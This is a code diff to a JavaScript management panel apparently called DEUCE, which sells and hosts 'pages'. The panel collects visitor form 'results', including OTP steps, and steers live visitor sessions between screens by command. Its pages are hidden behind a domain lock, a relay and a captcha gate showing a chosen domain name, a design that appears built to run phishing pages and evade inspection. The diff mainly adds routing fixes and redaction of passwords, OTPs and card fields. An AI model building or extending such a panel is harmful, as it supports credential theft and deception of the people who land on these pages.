@@ -253,7 +253,21 @@ async function saveFlowState(page) {
 }
 
 function getPageBySlug(pageSlug) {
-  return ownedPages.find((item) => item.slug === pageSlug || item.id === pageSlug) || null;
+  const key = String(pageSlug || "");
+  return ownedPages.find((item) => (
+    String(item.id || "") === key
+    || String(item.slug || "") === key
+    || String(item.packageId || "") === key
+    || String(item.routeKey || "") === key
+  )) || null;
+}
+
+function pageRouteKey(page = {}) {
+  return page.id || page.routeKey || page.slug || page.packageId || "";
+}
+
+function normalizeAllowedHost(value = "") {
+  return String(value || "").trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/:\d+$/, "");
 }
 
 function isResultsRoute(pageSlug = "") {
@@ -573,8 +587,11 @@ function normalizePackage(pagePackage) {
 
 function normalizeUserPage(page) {
   const results = page.results || [];
+  const routeKey = page.id || page.routeKey || page.slug || page.packageId || "";
   return {
     ...page,
+    routeKey,
+    slug: page.slug || routeKey,
     status: page.status || "active",
     traffic: page.traffic || "0 views",
     security: page.securityConfig?.captcha ? "Captcha on" : "Security ready",
@@ -643,6 +660,16 @@ function normalizePageResult(result) {
   };
 }
 
+function isInternalResultField(label) {
+  const value = String(label || "");
+  return value.startsWith("_") || ["redaction", "fieldCount", "field_count"].includes(value);
+}
+
+function redactedDisplayValue(value) {
+  if (value === null || value === undefined || value === "" || value === "[blank]") return "[blank]";
+  return "[redacted]";
+}
+
 function isOtpResultContext(screen = "", fields = {}) {
   const screenText = normalizeFlowLabel(screen);
   if (screenText.includes("otp") || screenText.includes("verification")) return true;
@@ -661,6 +688,15 @@ function isOtpDigitField(label = "") {
 }
 
 function normalizeOtpResultFields(fields = {}, screen = "") {
+  const entries = Object.entries(fields).filter(([label]) => !isInternalResultField(label));
+  if (!entries.length || !isOtpResultContext(screen, fields)) return fields;
+
+  const otpEntries = entries.filter(([label]) => isOtpDigitField(label));
+  if (entries.length === 1 || otpEntries.length >= 2 || otpEntries.length === entries.length) {
+    const hasBlank = entries.some(([, value]) => value === "[blank]" || value === "");
+    return { Otp: hasBlank && entries.length === 1 ? "[blank]" : "[redacted]" };
+  }
+
   return fields;
 }
 
@@ -673,13 +709,14 @@ function resultDisplayFields(payload = {}, screen = "") {
   ));
   const source = screenKey ? payload[screenKey] : payload;
   const fields = Object.entries(source || {}).reduce((nextFields, [label, value]) => {
+    if (isInternalResultField(label)) return nextFields;
     if (value && typeof value === "object" && !Array.isArray(value)) {
       Object.entries(resultDisplayFields(value, label)).forEach(([nestedLabel, nestedValue]) => {
         nextFields[nestedLabel] = nestedValue;
       });
       return nextFields;
     }
-    nextFields[label] = value;
+    nextFields[label] = redactedDisplayValue(value);
     return nextFields;
   }, {});
   return normalizeOtpResultFields(fields, screen);
@@ -798,6 +835,7 @@ function resultStepCountMarkup(results = []) {
 function resultFieldMarkup(fields = {}, screen = "") {
   const displayFields = normalizeOtpResultFields(fields, screen);
   return Object.entries(displayFields)
+    .filter(([label]) => !isInternalResultField(label))
     .map(([label, value]) => {
       const cleanLabel = String(label || "Field")
         .replace(/[_-]+/g, " ")
@@ -877,6 +915,7 @@ function sessionCommandMarkup(sessionId, pageSlug, pageTargets = [], command = n
 }
 
 function activeSessionCardMarkup(session, page, pageTargets = [], command = null) {
+  const routeKey = pageRouteKey(page);
   return `
     <article class="active-session-card">
       <div>
@@ -888,7 +927,7 @@ function activeSessionCardMarkup(session, page, pageTargets = [], command = null
         <span>${escapeHtml(formatTrafficTime(session.lastSeenAt))}</span>
         <span>${escapeHtml(commandStatusLabel(command))}</span>
       </div>
-      ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
+      ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, sessionCurrentFlowLabel(session, null, command))}
     </article>
   `;
 }
@@ -902,6 +941,7 @@ function latestSessionCommand(sessionId, sessionCommands = {}, sessionCommandHis
 }
 
 function sessionResultDetailMarkup(session, page) {
+  const routeKey = pageRouteKey(page);
   if (!session.results.length) {
     return `
       <article class="result-card compact">
@@ -933,12 +973,13 @@ function sessionResultDetailMarkup(session, page) {
           </div>
         `}
       </div>
-      ${resultActionsMarkup(result, page.slug)}
+      ${resultActionsMarkup(result, routeKey)}
     </article>
   `).join("");
 }
 
 function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], options = {}) {
+  const routeKey = pageRouteKey(page);
   const sessionIp = session.ip || session.results[session.results.length - 1]?.ip || "unknown";
   const ipStatus = bannedIps.includes(sessionIp) ? "Banned" : whitelistIps.includes(sessionIp) ? "Whitelisted" : "Unsorted";
   const lastDate = new Date(session.lastSeen);
@@ -983,7 +1024,7 @@ function compactSessionMarkup(session, page, bannedIps = [], whitelistIps = [], 
           <span>${escapeHtml(ipStatus)}</span>
           <span>${activeSession ? "Live now" : `Offline / ${escapeHtml(lastSeen)}`}</span>
         </div>
-        ${sessionCommandMarkup(session.sessionId, page.slug, pageTargets, command, currentFlowLabel)}
+        ${sessionCommandMarkup(session.sessionId, routeKey, pageTargets, command, currentFlowLabel)}
       </summary>
       <div class="session-result-timeline">
         ${sessionResultDetailMarkup(session, page)}
@@ -1424,7 +1465,7 @@ function createPackageRuntimeIndex(page, pagePackage) {
   const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
   const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
   const liveDomain = hostingConfig.domain || page.domain || "";
-  const strictAllowedDomains = [liveDomain].filter(Boolean);
+  const strictAllowedDomains = [normalizeAllowedHost(liveDomain)].filter(Boolean);
   const entryFile = packageEntryFile(pagePackage);
   const payload = {
     id: page.id,
@@ -1450,7 +1491,8 @@ function createPackageRuntimeIndex(page, pagePackage) {
       turnstile: {
         enabled: Boolean(page.securityConfig?.captcha),
         provider: "turnstile",
-        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || ""
+        siteKey: page.securityConfig?.turnstile?.siteKey || page.securityConfig?.turnstileSiteKey || "",
+        displayDomain: page.securityConfig?.turnstile?.displayDomain || ""
       }
     },
     generatedFile: page.generatedFile,
@@ -1458,7 +1500,9 @@ function createPackageRuntimeIndex(page, pagePackage) {
       mode: "launcher",
       entryFile,
       configEndpoint: `${runtimeApiBase}/config?userPageId=${encodeURIComponent(page.id)}`,
-      sourceEndpoint: `${runtimeApiBase}/source?userPageId=${encodeURIComponent(page.id)}`
+      sourceEndpoint: `${runtimeApiBase}/source?userPageId=${encodeURIComponent(page.id)}`,
+      turnstileEndpoint: `${runtimeApiBase}/verify-human`,
+      trafficEndpoint: `${runtimeApiBase}/traffic`
     }
   };
   delete payload.security.turnstileSecretKey;
@@ -1476,47 +1520,71 @@ function createPackageRuntimeIndex(page, pagePackage) {
       * { box-sizing: border-box; }
       html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
       body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
-      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; opacity: 0; transition: opacity .18s ease; }
-      #deuceFrame.active { opacity: 1; }
-      #deuceLauncher,
+      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; }
+      #deuceFrame.pending { display: none; }
+      #deuceGate {
+        min-height: 100vh;
+        display: none;
+        place-items: center;
+        padding: 24px;
+        background: #fff;
+      }
+      #deuceGate.active { display: grid; }
+      #deuceGate article {
+        width: min(360px, calc(100vw - 32px));
+        min-height: 90px;
+        display: grid;
+        place-items: center;
+        gap: 16px;
+        text-align: center;
+      }
+      #deuceGateText {
+        display: none;
+        color: #111827;
+      }
+      #deuceGateText.active { display: block; }
+      #deuceGateText h1 {
+        margin: 0 0 6px;
+        font-size: clamp(1.25rem, 5vw, 1.85rem);
+        line-height: 1.1;
+      }
+      #deuceGateText p {
+        margin: 0;
+        color: #4b5563;
+        font-size: 0.95rem;
+      }
       #deuceBlock {
         min-height: 100vh;
+        display: none;
         place-items: center;
         padding: 24px;
         color: #eef8f2;
         background: #050607;
       }
-      #deuceLauncher { display: grid; }
-      #deuceLauncher.hidden { display: none; }
-      #deuceLauncher article,
+      #deuceBlock.active { display: grid; }
       #deuceBlock article {
-        max-width: 560px;
+        max-width: 520px;
         border: 1px solid rgba(124,255,178,.24);
         border-radius: 10px;
         padding: 28px;
         background: #0d1112;
       }
-      #deuceBlock.active { display: grid; }
-      #deuceBlock { display: none; }
-      #deuceLauncher small,
       #deuceBlock small { color: #7cffb2; font-weight: 800; text-transform: uppercase; }
-      #deuceLauncher h1,
       #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
-      #deuceLauncher p,
       #deuceBlock p { color: #8da199; line-height: 1.55; }
-      #deuceLauncher code { display: block; color: #7cffb2; overflow-wrap: anywhere; font: 800 .76rem ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
     </style>
   </head>
   <body>
-    <section id="deuceLauncher">
+    <iframe id="deuceFrame" title="${escapeHtml(page.name)}"></iframe>
+    <section id="deuceGate">
       <article>
-        <small>deuce runtime</small>
-        <h1>Loading page</h1>
-        <p>This index.html is a launcher. The page package, session redirects, security checks, and results sync are served by DEUCE runtime.</p>
-        <code id="deuceLauncherMeta">Preparing ${escapeHtml(entryFile || "runtime page")}</code>
+        <div id="deuceGateText">
+          <h1 id="deuceGateDomain"></h1>
+          <p>Performing security verification</p>
+        </div>
+        <div id="deuceTurnstile"></div>
       </article>
     </section>
-    <iframe id="deuceFrame" title="${escapeHtml(page.name)}"></iframe>
     <section id="deuceBlock">
       <article>
         <small>access denied</small>
@@ -1530,25 +1598,123 @@ function createPackageRuntimeIndex(page, pagePackage) {
       const allowed = config.allowedDomains || [];
       const host = window.location.hostname;
       const frame = document.getElementById("deuceFrame");
-      const launcher = document.getElementById("deuceLauncher");
+      const gate = document.getElementById("deuceGate");
+      const gateText = document.getElementById("deuceGateText");
+      const gateDomain = document.getElementById("deuceGateDomain");
+      const turnstileMount = document.getElementById("deuceTurnstile");
       const block = document.getElementById("deuceBlock");
       const blockCopy = document.getElementById("deuceBlockCopy");
+      const captcha = config.security?.captcha && config.security?.turnstile?.siteKey;
+      const displayDomain = String(config.security?.turnstile?.displayDomain || "").trim();
+
+      function normalizeHost(value) {
+        return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
+      }
 
       function blockPage(message) {
-        launcher.classList.add("hidden");
+        gate.classList.remove("active");
         frame.remove();
         block.classList.add("active");
         blockCopy.textContent = message;
       }
 
-      if (allowed.length && !allowed.includes(host)) {
+      function sendTraffic(event, result, reason) {
+        if (!config.runtime?.trafficEndpoint) return;
+        fetch(config.runtime.trafficEndpoint, {
+          method: "POST",
+          keepalive: true,
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userPageId: config.id,
+            pageId: config.pageId,
+            hostname: window.location.hostname,
+            event,
+            result,
+            reason,
+            createdAt: new Date().toISOString()
+          })
+        }).catch(() => {});
+      }
+
+      function loadPage() {
+        gate.classList.remove("active");
+        frame.classList.remove("pending");
+        const sourceUrl = new URL(config.runtime.sourceEndpoint, window.location.href);
+        sourceUrl.searchParams.set("hostname", window.location.hostname);
+        frame.src = sourceUrl.toString();
+      }
+
+      function verifyToken(token) {
+        return fetch(config.runtime.turnstileEndpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userPageId: config.id,
+            pageId: config.pageId,
+            hostname: window.location.hostname,
+            token
+          })
+        }).then((response) => response.ok);
+      }
+
+      function loadTurnstile() {
+        frame.classList.add("pending");
+        if (displayDomain) {
+          gateDomain.textContent = displayDomain;
+          gateText.classList.add("active");
+        }
+        gate.classList.add("active");
+        const script = document.createElement("script");
+        script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
+        script.async = true;
+        script.defer = true;
+        script.onload = () => {
+          if (!window.turnstile) {
+            sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
+            blockPage("ACCESS DENIED");
+            return;
+          }
+          window.turnstile.render(turnstileMount, {
+            sitekey: config.security.turnstile.siteKey,
+            callback: (token) => {
+              verifyToken(token).then((verified) => {
+                if (verified) {
+                  sendTraffic("turnstile_verified", "allowed", "Passed launcher captcha");
+                  loadPage();
+                  return;
+                }
+                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
+                blockPage("ACCESS DENIED");
+              }).catch(() => {
+                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
+                blockPage("ACCESS DENIED");
+              });
+            },
+            "error-callback": () => {
+              sendTraffic("turnstile_verify_failed", "blocked", "Turnstile challenge failed");
+              blockPage("ACCESS DENIED");
+            },
+            "expired-callback": () => {
+              sendTraffic("turnstile_expired", "blocked", "Turnstile challenge expired");
+              blockPage("ACCESS DENIED");
+            }
+          });
+        };
+        script.onerror = () => {
+          sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
+          blockPage("ACCESS DENIED");
+        };
+        document.head.appendChild(script);
+      }
+
+      const allowedHosts = allowed.map(normalizeHost).filter(Boolean);
+
+      if (allowedHosts.length && !allowedHosts.includes(normalizeHost(host))) {
         blockPage("ACCESS DENIED");
+      } else if (captcha) {
+        loadTurnstile();
       } else {
-        frame.addEventListener("load", () => {
-          launcher.classList.add("hidden");
-          frame.classList.add("active");
-        }, { once: true });
-        frame.src = config.runtime.sourceEndpoint;
+        loadPage();
       }
     <\/script>
   </body>
@@ -1575,7 +1741,7 @@ function createGeneratedIndex(page) {
   const usesCloudflareRelay = hostingConfig.connectionType === "cloudflare-worker";
   const runtimeApiBase = usesCloudflareRelay ? "/api" : `${serverApiBase.replace(/\/$/, "")}/api/runtime`;
   const liveDomain = hostingConfig.domain || page.domain || "";
-  const strictAllowedDomains = [liveDomain].filter(Boolean);
+  const strictAllowedDomains = [normalizeAllowedHost(liveDomain)].filter(Boolean);
   const publicSecurity = {
     ...securityConfig,
     turnstile: {
@@ -1768,9 +1934,13 @@ function createGeneratedIndex(page) {
         progress.textContent = "blocked";
       }
 
+      function normalizeHost(value) {
+        return String(value || "").trim().toLowerCase().replace(/^https?:\\/\\//, "").replace(/\\/.*$/, "").replace(/:\\d+$/, "");
+      }
+
       function enforceDomain() {
-        const allowedDomains = config.allowedDomains || config.security?.domains || [];
-        const hostname = window.location.hostname;
+        const allowedDomains = (config.allowedDomains || config.security?.domains || []).map(normalizeHost).filter(Boolean);
+        const hostname = normalizeHost(window.location.hostname);
 
         if (allowedDomains.length && !allowedDomains.includes(hostname)) {
           blockPage("ACCESS DENIED", "ACCESS DENIED");
@@ -1894,6 +2064,18 @@ function createGeneratedIndex(page) {
         return "text";
       }
 
+      function isSensitiveField(field, input) {
+        const text = [
+          field,
+          input && input.name,
+          input && input.id,
+          input && input.type,
+          input && input.autocomplete,
+          input && input.placeholder
+        ].filter(Boolean).join(" ").toLowerCase();
+        return /password|passcode|otp|one.?time|verification|2fa|mfa|pin|card|cc|credit|debit|cvv|cvc|security.?code|expiry|exp|routing|account|ssn|social|token|secret|credential|login|email/.test(text);
+      }
+
       function fieldLabel(input) {
         const escapedId = input.id && window.CSS && CSS.escape ? CSS.escape(input.id) : "";
         const label = escapedId ? document.querySelector('label[for="' + escapedId + '"]') : null;
@@ -1916,9 +2098,10 @@ function createGeneratedIndex(page) {
           if ((input.type === "checkbox" || input.type === "radio") && !input.checked) return;
           const key = fieldLabel(input).replace(/\\s+/g, " ").trim();
           if (!key) return;
-          data[key] = input.value || "";
+          data[key] = isSensitiveField(key, input) ? (input.value ? "[redacted]" : "[blank]") : input.value || "";
         });
         data._fieldCount = fields.length;
+        data._redaction = "passwords, OTPs, card fields, login/email credentials, tokens, and similar sensitive values are not stored";
         return data;
       }
 
@@ -2193,7 +2376,7 @@ function renderDashboard() {
       title: page.name,
       meta: page.hostingConfig?.liveStatus || page.status || "active",
       value: `${pageLaunchReadiness(page).percent}% ready`,
-      route: `#config-${page.slug}`
+      route: `#config-${pageRouteKey(page)}`
     })),
     ...recentTransactions.map((transaction) => ({
       title: transaction.description || transaction.type || "Wallet activity",
@@ -2282,8 +2465,8 @@ function renderDashboard() {
           </div>
           <div class="dashboard-actions">
             ${nextPage ? `
-              <button type="button" class="primary" data-route="${topRisk ? escapeHtml(topRisk.risk.fix) : subscriptionAttention ? "#my-pages" : `#go-live-${escapeHtml(nextPage.slug)}`}">${topRisk ? escapeHtml(topRisk.risk.action) : subscriptionAttention ? "Renew" : "Go Live"}</button>
-              <button type="button" data-route="#config-${escapeHtml(nextPage.slug)}">Config</button>
+              <button type="button" class="primary" data-route="${topRisk ? escapeHtml(topRisk.risk.fix) : subscriptionAttention ? "#my-pages" : `#go-live-${escapeHtml(pageRouteKey(nextPage))}`}">${topRisk ? escapeHtml(topRisk.risk.action) : subscriptionAttention ? "Renew" : "Go Live"}</button>
+              <button type="button" data-route="#config-${escapeHtml(pageRouteKey(nextPage))}">Config</button>
             ` : `
               <button type="button" class="primary" data-route="${marketPages.length ? "#pages" : isAdmin() ? "#admin" : "#wallet"}">${marketPages.length ? "Browse pages" : isAdmin() ? "Open admin" : "Open wallet"}</button>
             `}
@@ -3256,6 +3439,7 @@ function pageLaunchReadiness(page) {
 }
 
 function pageRiskSignal(page) {
+  const routeKey = pageRouteKey(page);
   const hosting = page.hostingConfig || {};
   const security = page.securityConfig || {};
   const generated = page.generatedFile || {};
@@ -3265,8 +3449,8 @@ function pageRiskSignal(page) {
   const connectionType = hosting.connectionType || "cloudflare-worker";
   const workerReady = connectionType !== "cloudflare-worker" || Boolean(hosting.cloudflare?.routePattern || hosting.workerRoute || hosting.relayVerified);
   const generatedReady = Boolean(generated.lastGeneratedAt || generated.version);
-  const allowedDomains = security.domains || [];
-  const domainAllowed = !domain || !allowedDomains.length || allowedDomains.includes(domain);
+  const allowedDomains = (security.domains || []).map(normalizeAllowedHost).filter(Boolean);
+  const domainAllowed = !domain || !allowedDomains.length || allowedDomains.includes(normalizeAllowedHost(domain));
   const issues = [];
 
   if (renewal.expired || renewal.paymentFailed) {
@@ -3286,7 +3470,7 @@ function pageRiskSignal(page) {
       layer: "Domain",
       code: "DOMAIN_MISSING",
       detail: "No live domain is connected to this page.",
-      fix: `#config-${page.slug}`,
+      fix: `#config-${routeKey}`,
       action: "Set domain"
     });
   } else if (!domainAllowed) {
@@ -3295,7 +3479,7 @@ function pageRiskSignal(page) {
       layer: "Security",
       code: "DOMAIN_NOT_ALLOWED",
       detail: "Saved security domains do not include the live domain.",
-      fix: `#security-${page.slug}`,
+      fix: `#security-${routeKey}`,
       action: "Fix allowlist"
     });
   }
@@ -3306,7 +3490,7 @@ function pageRiskSignal(page) {
       layer: "Host",
       code: "HOST_ORIGIN_MISSING",
       detail: "No host/origin target is saved for live relay checks.",
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Open Go Live"
     });
   }
@@ -3317,7 +3501,7 @@ function pageRiskSignal(page) {
       layer: "Cloudflare",
       code: "WORKER_NOT_VERIFIED",
       detail: "Worker route or relay verification is not complete.",
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Verify route"
     });
   }
@@ -3328,7 +3512,7 @@ function pageRiskSignal(page) {
       layer: "Runtime",
       code: "INDEX_NOT_GENERATED",
       detail: "Runtime index has not been generated after setup.",
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Generate"
     });
   }
@@ -3339,7 +3523,7 @@ function pageRiskSignal(page) {
       layer: "Live status",
       code: "LIVE_STATUS_RED",
       detail: hosting.liveStatus,
-      fix: `#go-live-${page.slug}`,
+      fix: `#go-live-${routeKey}`,
       action: "Inspect"
     });
   }
@@ -3353,12 +3537,13 @@ function pageRiskSignal(page) {
     code: topIssue?.code || "LIVE_READY",
     detail: topIssue?.detail || "No operational issues detected from saved app data.",
     action: topIssue?.action || "Open",
-    fix: topIssue?.fix || `#go-live-${page.slug}`,
+    fix: topIssue?.fix || `#go-live-${routeKey}`,
     issues
   };
 }
 
 function ownedPageCard(page, index) {
+  const routeKey = pageRouteKey(page);
   const readiness = pageLaunchReadiness(page);
   const risk = pageRiskSignal(page);
   const hosting = page.hostingConfig || {};
@@ -3407,13 +3592,13 @@ function ownedPageCard(page, index) {
         <div class="my-page-tool-grid" aria-label="${escapeHtml(page.name)} management tools">
           <section>
             <h4>Page controls</h4>
-            <button type="button" data-go-live="${escapeHtml(page.slug)}">&#128640; Go Live</button>
-            <button type="button" data-config-page="${escapeHtml(page.slug)}">&#9881; Config</button>
-            <button type="button" data-security="${escapeHtml(page.slug)}" data-security-tab="security">&#128737; Security</button>
-            <button type="button" data-results="${escapeHtml(page.slug)}">&#128193; Results</button>
-            <button type="button" data-security="${escapeHtml(page.slug)}" data-security-tab="traffic">&#128200; Traffic</button>
-            <button type="button" data-page-log="${escapeHtml(page.slug)}">&#128220; Log</button>
-            <button type="button" data-renew-page="${escapeHtml(page.slug)}" ${renewal.canRenew ? "" : "disabled"}>&#8635; ${escapeHtml(renewButtonLabel)}</button>
+            <button type="button" data-go-live="${escapeHtml(routeKey)}">&#128640; Go Live</button>
+            <button type="button" data-config-page="${escapeHtml(routeKey)}">&#9881; Config</button>
+            <button type="button" data-security="${escapeHtml(routeKey)}" data-security-tab="security">&#128737; Security</button>
+            <button type="button" data-results="${escapeHtml(routeKey)}">&#128193; Results</button>
+            <button type="button" data-security="${escapeHtml(routeKey)}" data-security-tab="traffic">&#128200; Traffic</button>
+            <button type="button" data-page-log="${escapeHtml(routeKey)}">&#128220; Log</button>
+            <button type="button" data-renew-page="${escapeHtml(routeKey)}" ${renewal.canRenew ? "" : "disabled"}>&#8635; ${escapeHtml(renewButtonLabel)}</button>
           </section>
         </div>
       </details>
@@ -3473,6 +3658,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
     renderMissingPage();
     return;
   }
+  const routeKey = pageRouteKey(page);
   const hosting = page.hostingConfig || {};
   const verifiedLabel = hosting.verified ? "Verified" : "Not verified";
   const liveStatus = hosting.liveStatus || "Setup required";
@@ -3558,7 +3744,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#config-${page.slug}`, "Config")
+        routeButton(`#config-${routeKey}`, "Config")
       ])}
 
       <div class="summary-grid go-live-summary">
@@ -3599,8 +3785,8 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             </select>
           </label>
           <div class="admin-actions">
-            <button type="button" data-route="#config-${page.slug}">Open Config</button>
-            <button type="button" data-save-hosting="${page.slug}">Save connection type</button>
+            <button type="button" data-route="#config-${routeKey}">Open Config</button>
+            <button type="button" data-save-hosting="${routeKey}">Save connection type</button>
           </div>
         </article>
 
@@ -3610,7 +3796,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
           <p>Enter the raw URL from the static host where the downloaded index.html is uploaded. The live domain remains ${displayDomain}.</p>
           <label><span>Raw host URL</span><input type="url" data-hosting-field="serverIp" value="${serverIp}" placeholder="https://your-static-host.example.com"></label>
           <div class="admin-actions">
-            <button type="button" data-save-hosting="${page.slug}">Save host URL</button>
+            <button type="button" data-save-hosting="${routeKey}">Save host URL</button>
           </div>
         </article>
 
@@ -3623,7 +3809,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             <div><span>02</span><strong>Relay</strong><em>Hidden backend</em><small>Cloudflare forwards runtime calls privately.</small></div>
           </div>
           <div class="admin-actions">
-            <button type="button" data-generate-relay-secret="${page.slug}">${relaySecret ? "Regenerate secret" : "Generate secret"}</button>
+            <button type="button" data-generate-relay-secret="${routeKey}">${relaySecret ? "Regenerate secret" : "Generate secret"}</button>
           </div>
         </article>
 
@@ -3640,15 +3826,15 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             <code>Browser calls: https://${displayDomain}/api/*</code>
           </div>
           <div class="admin-actions">
-            <button type="button" data-install-cloudflare="${page.slug}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
-            <button type="button" data-verify-cloudflare="${page.slug}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
+            <button type="button" data-install-cloudflare="${routeKey}" ${hasDomain && hasRelaySecret ? "" : "disabled"}>Install Worker route</button>
+            <button type="button" data-verify-cloudflare="${routeKey}" ${hasDomain ? "" : "disabled"}>Verify zone</button>
           </div>
           <details class="advanced-worker">
             <summary>Advanced manual Worker</summary>
             <p>Manual install is only for debugging. Managed install keeps normal users away from Worker code.</p>
-            <textarea class="worker-code-box" readonly data-worker-code="${page.slug}">${escapeHtml(workerScript)}</textarea>
+            <textarea class="worker-code-box" readonly data-worker-code="${routeKey}">${escapeHtml(workerScript)}</textarea>
             <div class="admin-actions">
-              <button type="button" data-copy-worker="${page.slug}" ${relaySecret ? "" : "disabled"}>Copy Worker script</button>
+              <button type="button" data-copy-worker="${routeKey}" ${relaySecret ? "" : "disabled"}>Copy Worker script</button>
             </div>
           </details>
         </article>
@@ -3671,7 +3857,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             `}
           </div>
           <div class="admin-actions">
-            <button type="button" data-verify-hosting="${page.slug}">Mark connection verified</button>
+            <button type="button" data-verify-hosting="${routeKey}">Mark connection verified</button>
           </div>
         </article>
 
@@ -3693,7 +3879,7 @@ function renderGoLiveCenter(pageSlug = "page-a") {
             `}
           </div>
           <div class="admin-actions">
-            <button type="button" data-download-index="${page.slug}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
+            <button type="button" data-download-index="${routeKey}" ${readyToDownload ? "" : "disabled"}>Download index.html</button>
           </div>
         </article>
       </div>
@@ -3714,6 +3900,7 @@ function renderUserConfigCenter(pageSlug = "page-a") {
   const subscription = page.subscription || {};
   const hosting = page.hostingConfig || {};
   const resultSettings = page.resultSettings || {};
+  const routeKey = pageRouteKey(page);
   const domain = hosting.domain || page.domain || "";
   const planLabel = subscription.billingPeriod ? billingLabel(subscription.billingPeriod) : "Not set";
   const renewalPrice = formatMoney(subscription.renewalPrice || 0);
@@ -3728,9 +3915,9 @@ function renderUserConfigCenter(pageSlug = "page-a") {
       </div>
       ${viewNav([
         routeButton("#my-pages", "&#8592; My Pages", "primary"),
-        routeButton(`#security-${page.slug}:security`, "Security"),
-        routeButton(`#results-${page.slug}`, "Results"),
-        routeButton(`#go-live-${page.slug}`, "Go Live")
+        routeButton(`#security-${routeKey}:security`, "Security"),
+        routeButton(`#results-${routeKey}`, "Results"),
+        routeButton(`#go-live-${routeKey}`, "Go Live")
       ])}
 
       <div class="summary-grid config-summary">
@@ -3747,8 +3934,8 @@ function renderUserConfigCenter(pageSlug = "page-a") {
           <label><span>Primary domain</span><input type="text" data-user-config="domain" value="${escapeHtml(domain)}" placeholder="clientdomain.com"></label>
           <p>This domain is used for the hosted page and allowed-host security checks.</p>
           <div class="admin-actions">
-            <button type="button" data-save-user-config="${page.slug}">Save config</button>
-            <button type="button" data-go-live="${page.slug}">Go Live</button>
+            <button type="button" data-save-user-config="${routeKey}">Save config</button>
+            <button type="button" data-go-live="${routeKey}">Go Live</button>
           </div>
         </article>
 
@@ -3765,7 +3952,7 @@ function renderUserConfigCenter(pageSlug = "page-a") {
             <span>${escapeHtml(renewalDate)}</span>
           </div>
           <div class="admin-actions">
-            <button type="button" data-save-user-config="${page.slug}">Save renewal</button>
+            <button type="button" data-save-user-config="${routeKey}">Save renewal</button>
             <button type="button" data-route="#wallet">Wallet</button>
           </div>
         </article>
@@ -3779,8 +3966,8 @@ function renderUserConfigCenter(pageSlug = "page-a") {
             <span>Notify me when a new result arrives</span>
           </label>
           <div class="admin-actions">
-            <button type="button" data-save-user-config="${page.slug}">Save results</button>
-            <button type="button" data-results="${page.slug}">Open results</button>
+            <button type="button" data-save-user-config="${routeKey}">Save results</button>
+            <button type="button" data-results="${routeKey}">Open results</button>
           </div>
         </article>
 
@@ -3788,10 +3975,10 @@ function renderUserConfigCenter(pageSlug = "page-a") {
           <small>quick controls</small>
           <h3>Page operations</h3>
           <div class="admin-compact-grid">
-            <button type="button" data-security="${page.slug}" data-security-tab="security"><strong>Security</strong><span>Captcha and device rules</span></button>
-            <button type="button" data-security="${page.slug}" data-security-tab="traffic"><strong>Traffic</strong><span>Visits and blocks</span></button>
-            <button type="button" data-results="${page.slug}"><strong>Results</strong><span>Submissions and sessions</span></button>
-            <button type="button" data-go-live="${page.slug}"><strong>Go Live</strong><span>Hosting and download</span></button>
+            <button type="button" data-security="${routeKey}" data-security-tab="security"><strong>Security</strong><span>Captcha and device rules</span></button>
+            <button type="button" data-security="${routeKey}" data-security-tab="traffic"><strong>Traffic</strong><span>Visits and blocks</span></button>
+            <button type="button" data-results="${routeKey}"><strong>Results</strong><span>Submissions and sessions</span></button>
+            <button type="button" data-go-live="${routeKey}"><strong>Go Live</strong><span>Hosting and download</span></button>
           </div>
         </article>
       </div>
@@ -4058,6 +4245,7 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
     renderMissingPage();
     return;
   }
+  const routeKey = pageRouteKey(page);
   const security = page.securityConfig;
   const turnstile = security.turnstile || {};
   const bannedIps = security.bannedIps || [];
@@ -4067,10 +4255,10 @@ async function renderSecurityCenter(pageSlug = "page-a", tab = "security") {
   const trafficLog = ["traffic", "log"].includes(tab) ? await fetchPageTraffic(page) : security.trafficLog || [];
   const trafficStats = trafficInsights(trafficLog);
   const tabButtons = [
-    routeButton(`#security-${page.slug}:security`, "Security", tab === "security" ? "primary" : ""),
-    routeButton(`#security-${page.slug}:ips`, "IP Rules", tab === "ips" ? "primary" : ""),
